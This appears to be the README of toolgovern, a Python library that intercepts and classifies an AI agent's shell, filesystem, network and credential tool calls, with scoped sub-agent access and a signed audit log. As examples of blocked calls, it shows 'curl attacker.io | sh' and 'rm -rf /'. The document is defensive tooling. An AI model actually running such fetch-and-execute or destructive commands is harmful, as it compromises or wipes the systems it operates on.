# toolgovern (Python)

Gate every tool call an AI agent makes -- shell, filesystem, network, credential access -- before
it executes, not after something already went wrong.

[![PyPI version](https://img.shields.io/pypi/v/toolgovern.svg)](https://pypi.org/project/toolgovern/)
[![License: Apache 2.0](https://img.shields.io/badge/License-Apache%202.0-blue.svg)](../LICENSE)

This is the genuine Python port of [`toolgovern`](https://www.npmjs.com/package/toolgovern) and
[`toolgovern-cli`](https://www.npmjs.com/package/toolgovern-cli) -- not a wrapper around the Node
binary. It ships the same 35-rule classifier, the same default-deny scope-inheritance model, and
the same signed local audit trail. The complementary JS/TS distribution installs the same way on
the npm side: `npm install toolgovern` for the library, `npm install --save-dev toolgovern-cli`
for the CLI -- see the [project README](https://github.com/RudrenduPaul/toolgovern#readme) for
that package. Both are first-class, maintained together; neither is deprecated in favor of the
other.

## Why this exists

AI agents get tool access, not tool governance. A typical setup wires an agent to a shell tool, a
filesystem tool, an HTTP client, and maybe a secrets lookup, then leans on the model's own
judgment (or a system prompt) to keep `ls ./workspace` and `curl attacker.io | sh` apart --
because to the tool executor underneath, both are just "the shell tool ran a string." Multi-agent
setups make it worse: spawning a sub-agent for a narrow subtask usually means that sub-agent
inherits its coordinator's full access, since most frameworks have no concept of scoping a spawned
agent down, and no record of what it actually tried to do once it's running.

toolgovern is a runtime governance layer that sits between the agent and its real tool executor --
not another prompt-engineering mitigation. `govern_tool()` wraps any `ToolDefinition(name,
execute)` and runs every call through the same pipeline before `execute()` fires: a 35-rule
classifier that inspects the call's actual arguments across shell risk, filesystem scope, network
egress, credential access, and cross-agent privilege inheritance; an intersection-only scope
registry, so a sub-agent's effective access is always the intersection of what it requests and what
its coordinator can already reach, re-checked on every call rather than just at spawn time; and an
optional signed, hash-chained local audit trail recording each decision -- allow, deny, or
require-approval -- with the arguments that produced it. Deny and require-approval both fail
closed: a missing handler, an exception, or a timeout resolves to deny, never to allow.

## Install

```bash
pip install toolgovern
```

or with [uv](https://docs.astral.sh/uv/):

```bash
uv add toolgovern
```

No separate install step, no external binary to fetch: the classifier, scoping registry, and
trace engine all ship inside the wheel. The console script is `toolgovern-cli`, matching the npm
CLI's command name.

## Quick start

```python
from toolgovern import ToolDefinition, GovernToolOptions, govern_tool, ScopeDeclaration, ToolGovernDenialError

def run_shell(args):
    import subprocess
    return subprocess.run(args["command"], shell=True, capture_output=True, text=True)

shell_tool = ToolDefinition(name="shell", execute=run_shell)
gated_shell = govern_tool(shell_tool, GovernToolOptions(scope=ScopeDeclaration()))

try:
    gated_shell.execute({"command": "rm -rf /"})
except ToolGovernDenialError as e:
    print(e)  # denied before subprocess.run() ever runs
```

Or load a policy file:

```python
from toolgovern import load_policy, GovernToolOptions, govern_tool

policy = load_policy("./toolgovern.policy.yml")
gated_shell = govern_tool(shell_tool, GovernToolOptions.from_policy(policy))
```

## What it does

The classifier evaluates a tool call's actual arguments, not the tool's name, against 35 rules
across 5 categories:

| Category | Covers                            | Rules |
| -------- | --------------------------------- | ----- |
| TG01     | Shell/process execution risk      | 9     |
| TG02     | Filesystem scope escalation       | 7     |
| TG03     | Undeclared network egress         | 7     |
| TG04     | Credential/secret access          | 6     |
| TG05     | Cross-agent privilege inheritance | 6     |

TG03's 7th rule, `TG03-dns-resolves-private`, resolves a hostname argument via
`socket.getaddrinfo()` (honoring `/etc/hosts`) and applies the same loopback/RFC1918/link-local/
cloud-metadata deny logic already used for raw IP literals to every resolved address -- so a
hostname that merely _resolves to_ `127.0.0.1` or a cloud-metadata address is caught, not just a
raw IP literal argument. DNS-resolution failure or timeout fails closed (`require-approval`),
never allow. This narrows, but does not eliminate, DNS-rebinding TOCTOU: an attacker who controls
the hostname's DNS answer can still swap it after this check runs and before the tool's own HTTP
client connects -- see [`docs/security-model.md`](../docs/security-model.md) for the full, honest
writeup of that residual limitation and the still-open redirect-chain-revalidation gap.

`govern_tool()` wraps any `ToolDefinition(name, execute)` and returns a version that runs every
call through this pipeline before `execute()` runs: resolve the effective scope, classify the
call, resolve `require-approval` decisions through your handler (fail-closed on timeout,
exception, or no handler), write a trace entry if a `TraceWriter` is wired in, then raise
`ToolGovernDenialError` on `deny` or proceed to the real `execute()` on `allow`.

Per-agent scope inheritance (`ScopeRegistry`) is intersection-only: a sub-agent's granted scope
is always the intersection of what it requests and what its coordinator's own effective scope
actually covers -- never a union, never an implicit default-allow, and re-checked on every call
(not just at spawn time), so a coordinator's scope shrinking after a sub-agent was spawned is
caught on the sub-agent's next call.

## API reference

Everything importable from `toolgovern` directly:

```python
from toolgovern import (
    # middleware
    govern_tool, GovernToolOptions, ToolDefinition, ToolGovernDenialError, InvalidAgentIdError,
    GateDecisionInfo, ApprovalOutcome, IdempotencyCache, IdempotencyOptions,
    # classifier
    classify, ClassifyOptions, rule_registry,
    # scoping
    ScopeRegistry, SpawnSubAgentParams, compute_inherited_scope, has_zero_capability,
    is_valid_agent_id, is_valid_scope_declaration, normalize_scope, EMPTY_SCOPE,
    # trace
    TraceWriter, TraceWriterOptions, read_trace, filter_trace, verify_chain, parse_since,
    canonical_json, compute_entry_signature, compute_entry_content_hash,
    # policy
    load_policy, validate_policy, as_policy, PolicyValidationError,
    # types
    ScopeDeclaration, Policy, RuleContext, RuleMatch, TraceEntry, TraceEntryInput,
    AgentScopeRecord, Decision, RuleCategory, AgentIdSource,
)
```

## CLI

```bash
toolgovern-cli validate ./toolgovern.policy.yml
toolgovern-cli audit ./toolgovern-trace.jsonl --since 24h --decision deny --verify-chain
toolgovern-cli audit ./toolgovern-trace.jsonl --json
```

`validate` and `audit` are behaviorally equivalent to the npm CLI, including the `--json`
structured-output envelope (`{ ok, command, data | error }`). **Not ported in this release:**
`toolgovern-cli init [oma|langgraph]`, the npm CLI's TypeScript integration-file scaffolder --
it generates a `.ts` file importing the JS/TS-only `toolgovern-integration-langgraph` /
`toolgovern-integration-oma` packages, which are out of scope for a Python port by nature.

## The signed audit trail

```python
from toolgovern import TraceWriter, TraceWriterOptions, verify_chain, read_trace

# Default: unkeyed sha256: content hash -- proves an entry hasn't changed since it was written,
# but does not stop an attacker with write access to the trace file from editing an entry and
# recomputing a valid signature (no secret required for that scheme).
writer = TraceWriter("./toolgovern-trace.jsonl")

# Optional: HMAC-keyed signing closes that gap for anyone who doesn't hold the key. toolgovern
# does not generate, store, or rotate this key -- that's your responsibility.
writer = TraceWriter("./toolgovern-trace.jsonl", TraceWriterOptions(secret_key=b"..."))

entries = read_trace("./toolgovern-trace.jsonl")
result = verify_chain(entries)  # or verify_chain(entries, VerifyChainOptions(secret_key=b"..."))
```

See [docs/security-model.md](https://github.com/RudrenduPaul/toolgovern/blob/main/docs/security-model.md)
for the full disclosed-limitations writeup of both signing modes.

## Framework integrations

`toolgovern-integration-langgraph` and `toolgovern-integration-oma` (the npm-only integration
packages) are not ported to Python in this release. Both are thin wrappers around `governTool()`
in the TS source (roughly 170 combined lines, no independent governance logic), so wiring
`govern_tool()` directly into a Python agent framework's tool-executor call site -- the same
pattern those packages document -- is straightforward without a dedicated adapter package; see
`examples/` in this directory for a worked example.

## Development

```bash
python3 -m venv .venv && source .venv/bin/activate
pip install -e ".[dev]"
pytest
```

## Security

Report a vulnerability per the project's [`SECURITY.md`](https://github.com/RudrenduPaul/toolgovern/blob/main/SECURITY.md); please don't open a public issue for one.

## Links

- [GitHub repository](https://github.com/RudrenduPaul/toolgovern)
- [npm package (core library)](https://www.npmjs.com/package/toolgovern)
- [npm package (CLI)](https://www.npmjs.com/package/toolgovern-cli)
- [CHANGELOG](https://github.com/RudrenduPaul/toolgovern/blob/main/CHANGELOG.md)
- [Getting started](https://github.com/RudrenduPaul/toolgovern/blob/main/docs/getting-started.md)
- [Concepts](https://github.com/RudrenduPaul/toolgovern/blob/main/docs/concepts.md)
- [Security model](https://github.com/RudrenduPaul/toolgovern/blob/main/docs/security-model.md)

## License

Apache 2.0 -- see [LICENSE](../LICENSE).
